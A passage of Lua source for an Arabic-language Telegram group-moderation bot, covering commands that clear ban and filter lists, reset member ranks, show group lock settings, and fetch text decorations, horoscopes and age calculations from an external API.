if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة المنع \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:filters:'..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قوائم المنع \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:filters:'..msg.chat_id_)
DevFeras:del(DevFeras.."filteranimation"..msg.chat_id_)
DevFeras:del(DevFeras.."filterphoto"..msg.chat_id_)
DevFeras:del(DevFeras.."filtersteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevFeras:del(DevFeras.."filteranimation"..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة منع المتحركات \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevFeras:del(DevFeras.."filterphoto"..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة منع الصور \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevFeras:del(DevFeras.."filtersteckr"..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة منع الملصقات \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
end
--     Source DevFeras     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not Monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط ', 1, 'md')
else
DevFeras:del(DevFeras..'abs:Ban:'..msg.chat_id_)
DevFeras:del(DevFeras..'abs:admins:'..msg.chat_id_)
DevFeras:del(DevFeras..'bot:donky:'..msg.chat_id_)
DevFeras:del(DevFeras..'abs:vipmem:'..msg.chat_id_)
DevFeras:del(DevFeras..'bot:filters:'..msg.chat_id_)
DevFeras:del(DevFeras..'abs:Muted:'..msg.chat_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     Source DevFeras     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not AbsMonsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لمنشئ المجموعه فقط ', 1, 'md')
else
local monsh = DevFeras:smembers(DevFeras..'abs:monsh:'..msg.chat_id_)
local monshid = DevFeras:smembers(DevFeras..'abs:monshid:'..msg.chat_id_)
local owners = DevFeras:smembers(DevFeras..'abs:owners:'..msg.chat_id_)
local admins = DevFeras:smembers(DevFeras..'abs:admins:'..msg.chat_id_)
local vipmem = DevFeras:smembers(DevFeras..'abs:vipmem:'..msg.chat_id_)
local donky = DevFeras:smembers(DevFeras..'abs:donky:'..msg.chat_id_)
if #monsh ~= 0 then monsht = 'المنشئين الاساسيين • ' else monsht = '' end
if #monshid ~= 0 then monshidt = 'المنشئين • ' else monshidt = '' end
if #owners ~= 0 then ownerst = 'المدراء • ' else ownerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #monsh ~= 0 or #monshid ~= 0 or #owners ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevFeras:del(DevFeras..'abs:monsh:'..msg.chat_id_)
DevFeras:del(DevFeras..'abs:monshid:'..msg.chat_id_)
DevFeras:del(DevFeras..'abs:owners:'..msg.chat_id_)
DevFeras:del(DevFeras..'abs:admins:'..msg.chat_id_)
DevFeras:del(DevFeras..'abs:vipmem:'..msg.chat_id_)
DevFeras:del(DevFeras..'bot:donky:'..msg.chat_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع الرتب التاليه ↫ ❨ "..monsht..''..monshidt..''..ownerst..''..adminst..''..vipmemt..''..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:sens:spam'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevFeras:get(DevFeras..'bot:sens:spam'..msg.chat_id_)
end
--     Source DevFeras     --
if DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقييد"     
elseif DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source DevFeras     --
if DevFeras:get(DevFeras.."abs:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevFeras:get(DevFeras.."abs:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقييد"   
elseif DevFeras:get(DevFeras.."abs:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source DevFeras     --
if DevFeras:get(DevFeras..'bot:text:mute'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevFeras:get(DevFeras..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:video:mute'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:music:mute'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:location:mute'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:document:mute'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevFeras:get(DevFeras..'markdown:lock'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevFeras:get(DevFeras..'bot:Join:mute'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevFeras:get(DevFeras.."bot:welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevFeras:get(DevFeras..'fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevFeras:get(DevFeras..'kaf'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevFeras:get(DevFeras..'taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevFeras:get(DevFeras..'farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source DevFeras     --
local TXTE = "⌁︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
.."⌁︙الروابط ↫ "..mute_links.."\n"
.."⌁︙المعرف ↫ "..lock_tag.."\n"
.."⌁︙البوتات ↫ "..lock_bots.."\n"
.."⌁︙المتحركه ↫ "..mute_gifs.."\n"
.."⌁︙الملصقات ↫ "..lock_sticker.."\n"
.."⌁︙الملفات ↫ "..lock_file.."\n"
.."⌁︙الصور ↫ "..mute_photo.."\n"
.."⌁︙الفيديو ↫ "..mute_video.."\n"
.."⌁︙الاونلاين ↫ "..mute_in.."\n"
.."⌁︙الدردشه ↫ "..mute_text.."\n"
.."⌁︙التوجيه ↫ "..lock_forward.."\n"
.."⌁︙الاغاني ↫ "..mute_music.."\n"
.."⌁︙الصوت ↫ "..mute_voice.."\n"
.."⌁︙الجهات ↫ "..lock_contact.."\n"
.."⌁︙الماركداون ↫ "..markdown.."\n"
.."⌁︙الهاشتاك ↫ "..lock_htag.."\n"
.."⌁︙التعديل ↫ "..mute_edit.."\n"
.."⌁︙التثبيت ↫ "..lock_pin.."\n"
.."⌁︙الاشعارات ↫ "..lock_tgservice.."\n"
.."⌁︙الكلايش ↫ "..lock_spam.."\n"
.."⌁︙الدخول ↫ "..lock_Join.."\n"
.."⌁︙الشبكات ↫ "..lock_wp.."\n"
.."⌁︙المواقع ↫ "..lock_location.."\n"
.."⌁︙الفشار ↫ "..lock_fshar.."\n"
.."⌁︙الكفر ↫ "..lock_kaf.."\n"
.."⌁︙الطائفيه ↫ "..lock_taf.."\n"
.."⌁︙العربيه ↫ "..lock_arabic.."\n"
.."⌁︙الانجليزيه ↫ "..lock_english.."\n"
.."⌁︙الفارسيه ↫ "..lock_farsi.."\n"
.."⌁︙التكرار ↫ "..flood.."\n"
.."⌁︙عدد التكرار ↫ "..Flood_Num.."\n"
.."⌁︙عدد السبام ↫ "..spam_c.."\n"
.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://T.ME/DevFeras)\n"
Dev_Feras(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source DevFeras     --
if text and text:match("^كول (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Feras(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
--     Source DevFeras     --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if (text and text == 'تفعيل ردود البوت') and ChCheck(msg) or (text and text == 'تفعيل الردود') and ChCheck(msg) or (text and text == 'تفعيل ردود المطور') and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ردود المطور ،بالتاكيد ،مفعله ', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:rep:mute'..msg.chat_id_)
end end
if (text and text == 'تعطيل ردود البوت') and ChCheck(msg) or (text and text == 'تعطيل الردود') and ChCheck(msg) or (text and text == 'تعطيل ردود المطور') and ChCheck(msg) then
if DevFeras:get(DevFeras..'bot:rep:mute'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ردود المطور ،بالتاكيد ،معطله ', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:rep:mute'..msg.chat_id_,true)
end end
end
--     Source DevFeras     --
if DevFeras:get(DevFeras..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevFeras:del(DevFeras..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevFeras:del(DevFeras..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevFeras:set(DevFeras..'bot:rules'..msg.chat_id_,text)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي القوانين الان', 1, 'md')
DevFeras:set(DevFeras..'bot:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") then
local rules = DevFeras:get(DevFeras..'bot:rules'..msg.chat_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source DevFeras     --
if text == "راسلني" then
SendRep = {"ها هلاو","ها حبي كول","انطق","كول"};
SendTo = SendRep[math.random(#SendRep)]
https.request("https://api.telegram.org/bot"..TokenBot..'/sendmessage?chat_id='..msg.sender_user_id_..'&text='..URL.escape(SendTo))
end
--     Source DevFeras     --
if text == "تفعيل الزخرفه" and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:Zrf:Abs'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:Zrf:Abs'..msg.chat_id_,true)  
end
--     Source DevFeras     --
if DevFeras:get(DevFeras..'Zrf:Abs'..msg.chat_id_..''..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الزخرفه', 1, 'md')
DevFeras:del(DevFeras..'Zrf:Abs'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌁︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevFeras:del(DevFeras..'Zrf:Abs'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if not DevFeras:get(DevFeras..'bot:Zrf:Abs'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg)  then  
DevFeras:setex(DevFeras.."Zrf:Abs"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
--     Source DevFeras     --
if not DevFeras:get(DevFeras..'bot:Zrf:Abs'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") or text and text:match("^زخرف (.*)$") then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌁︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source DevFeras     --
if text == "تفعيل الابراج" and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:Brg:Abs'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:Brg:Abs'..msg.chat_id_,true)  
end
--     Source DevFeras     --
if not DevFeras:get(DevFeras..'bot:Brg:Abs'..msg.chat_id_) then
if text and text:match("^برج (.*)$") or text and text:match("^برجي (.*)$") then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
Dev_Feras(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source DevFeras     --
if text == "تفعيل حساب العمر" and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:Age:Abs'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:Age:Abs'..msg.chat_id_,true)  
end
--     Source DevFeras     --
if not DevFeras:get(DevFeras..'bot:Age:Abs'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") or text and text:match("^عمري (.*)$") then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Dev_Feras(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الروابط$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الروابط ↫ "..mute_links.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^المعرف$") or text and text:match("^المعرفات$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙المعرف ↫ "..lock_tag.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^المتحركه$") or text and text:match("^الملصقات المتحركه$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙المتحركه ↫ "..mute_gifs.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الملصقات$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الملصقات ↫ "..lock_sticker.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الملفات$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:document:mute'..msg.chat_id_) then lock_file = 'مقفوله' else lock_file = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الملفات ↫ "..lock_file.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الصور$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الصور ↫ "..mute_photo.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الفيديو$") or text and text:match("^الفيديوهات$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:video:mute'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الفيديو ↫ "..mute_video.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الاونلاين$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local Feras_dev = "\n" .."⌁︙الاونلاين ↫ "..mute_in.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الدردشه$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:text:mute'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الدردشه ↫ "..mute_text.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^التوجيه$") or text and text:match("^اعاده التوجيه$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local Feras_dev = "\n" .."⌁︙التوجيه ↫ "..lock_forward.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الاغاني$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:music:mute'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الاغاني ↫ "..mute_music.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الصوت$") or text and text:match("^الصوتيات$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local Feras_dev = "\n" .."⌁︙الصوت ↫ "..mute_voice.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الجهات$") or text and text:match("^جهات الاتصال$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الجهات ↫ "..lock_contact.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الماركداون$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'markdown:lock'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local Feras_dev = "\n" .."⌁︙الماركداون ↫ "..markdown.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الهاشتاك$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local Feras_dev = "\n" .."⌁︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^التعديل$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local Feras_dev = "\n" .."⌁︙التعديل ↫ "..mute_edit.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^التثبيت$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local Feras_dev = "\n" .."⌁︙التثبيت ↫ "..lock_pin.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الاشعارات$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
if text and text:match("^الكلايش$") then if  DevFeras:get(DevFeras..'abs:LockSettings'..msg.chat_id_) then if DevFeras:get(DevFeras..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local Feras_dev = "\n" .."⌁︙الكلايش ↫ "..lock_spam.."\n" Dev_Feras(msg.chat_id_, msg.id_, 1, Feras_dev, 1, 'md') end end
